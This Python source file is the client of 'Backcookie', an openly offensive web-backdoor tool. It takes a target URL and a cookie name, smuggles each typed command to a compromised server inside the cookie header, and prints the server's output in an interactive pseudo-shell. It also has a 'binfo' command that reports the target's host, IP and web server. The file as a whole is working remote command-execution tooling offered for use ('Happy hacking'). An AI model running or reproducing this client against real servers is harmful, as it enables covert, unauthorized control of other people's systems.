#!/usr/bin/env python
# -*- coding: utf-8 -*-
#**
#
##############
# Backcookie #
##############
#
# Backcookie depends of this file
# For full copyright information this visit: https://github.com/jofpin/backcookie
#
# Copyright 2016 by Jose Pino <jofpin@gmail.com>
#**

import os                                    
import sys                                   
import optparse                               
import socket
import readline                              
import requests 
from sys import argv     
from core.elements import elements 


# class of all elements
elements = elements()

class Backcookie(object):
    def __init__(self):
    	# data general of author
        self.nameShell = "backcookie"


    def rootConnection(self): 
        if os.getuid() != 0:
            elements.go("\t" + "-------------------------")
            elements.go("\t" + "> Welcome to " + elements.name + " <")
            elements.go("\t" + "-------------------------")
            elements.go(elements.color["blueBold"] + "[*] " + elements.color["white"] + "Hello " + elements.color["greenBold"] + os.uname()[1] + "," + elements.color["white"] + " I hope you enjoy my role")
            elements.go(elements.color["redBold"] + "[x] " + elements.color["white"] + "You must run in mode " + elements.color["whiteBold"] + "root" + elements.color["white"] + " to be able to operate.")
            elements.close(0)

    def showShell(self, command, host, cookie, vcmd):
        headers = {
               elements.userAgentName: elements.userAgentValue, 
               elements.cookie: cookie + '=' + command.encode(elements.encode)
              }
        try:
            request = requests.get(host, headers=headers)
            val = request.headers.values()
        except:
            elements.go(elements.color["redBold"] + "Error: " + elements.color["white"] + "No were I can connect to the server")
        if val[0] == "0" or vcmd == "command": # vcmd > validate command
            elements.go(elements.color['blue'] + request.text.strip() + elements.color['white'])
        else:
            pass

    # Autocompletion of console (shell sack)
    readline.parse_and_bind("tab:complete")
    readline.set_completer(elements.niceShell)

    def shell(self, host, cookie):
        self.showShell("", host, cookie, "")
         # Open url
        openUrl = requests.get(host)

        # Info server
        server = openUrl.headers.get("server")

        # The domain
        domain = host.split("/")[2]

        # Home of backcookie 
        elements.go("\033[H\033[J")
        elements.go("\t  _   _   _   _   _   _   _   _   _   _  ")
        elements.go("\t / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ ")
        elements.go("\t( " + elements.color['redBold'] + "b" + elements.color['white'] + " | " + elements.color['redBold'] + "a" + elements.color['white'] + " | " +  elements.color['redBold'] + "c" + elements.color['white'] + " | " + elements.color['redBold'] + "k" + elements.color['white'] + " | " + elements.color['redBold'] + "c" + elements.color['white'] + " | " + elements.color['redBold'] + "o" + elements.color['white'] + " | " + elements.color['redBold'] + "o" + elements.color['white'] + " | " + elements.color['redBold'] + "k" + elements.color['white'] + " | " + elements.color['redBold'] + "i" + elements.color['white'] + " | " + elements.color['redBold'] + "e" + elements.color['white'] + " )")
        elements.go("\t \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ ")
        elements.go("\t v1.0.2             by " + elements.color['white'] + elements.authorName + " " + elements.color['blue'] + elements.authorTwitter + "\n")
        elements.go(elements.color['green'] + "[+] " + elements.color['blue']  + "Happy hacking" + elements.color['white'])
        elements.go(elements.color['green'] + "[+] " + elements.color['blue']  + elements.description + "\n" + elements.color['white'])

        while True:
            try:
                command = raw_input(self.nameShell + "@" + domain + ":~$ ")
                if command != "binfo": 
                    self.showShell(command, host, cookie, "command")
                else:
                    elements.go("")
                    elements.go(elements.color['yellow'] + "[*] " + elements.color['white']  + "Information" + elements.color['white'])
                    elements.go(elements.color['yellow'] + "[!] " + elements.color['green']  + "Host: " + elements.color['blue'] + domain + elements.color['white'])
                    elements.go(elements.color['yellow'] + "[!] " + elements.color['green']  + "Ip: " + elements.color['blue'] + elements.goip(domain) + elements.color['white'])
                    elements.go(elements.color['yellow'] + "[!] " + elements.color['green']  + "WebServer: " + elements.color['blue'] + server + elements.color['white'])
                    elements.go(elements.color['yellow'] + "[!] " + elements.color['green']  + "Target: " + elements.color['blue'] + host + elements.color['white'])
                    elements.go(elements.color['yellow'] + "[!] " + elements.color['green']  + "Cookie: " + elements.color['blue'] + cookie + elements.color['white'])
                    elements.go("")

                command = raw_input(self.nameShell + "@" + domain + ":~$ ")
                if command != "exit": # exit console backcookie
                    self.showShell(command, host, cookie, "command")
                else:
                    elements.go(elements.color['red'] + "Goodbye: " + elements.color['white'] +  "Thank you for having me used, I hope soon.")
                    break
            except KeyboardInterrupt:
                elements.go("")
                elements.go(elements.color["redBold"] + "Alert: " + elements.color['white'] + "Interrupted.")
            except Exception as error:
                elements.go(elements.color["redBold"] + "Error: " + elements.color['white'] + "%s" % error)

    def main(self):
        # Detect operating system, to compose the compatibility
        elements.checkOS()
        # options 
        parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.2")
        parser.add_option("-u", "--url", dest="Url", type="string", help="specify hostname to run on")
        parser.add_option("-c", "--cookie", dest="Cookie", type="string", help="specify Cookie")
        (options, args) = parser.parse_args()
        host = options.Url
        cookie = options.Cookie
        if host and cookie:
            self.shell(host, cookie)
        else:
            parser.print_help()
            elements.close(0)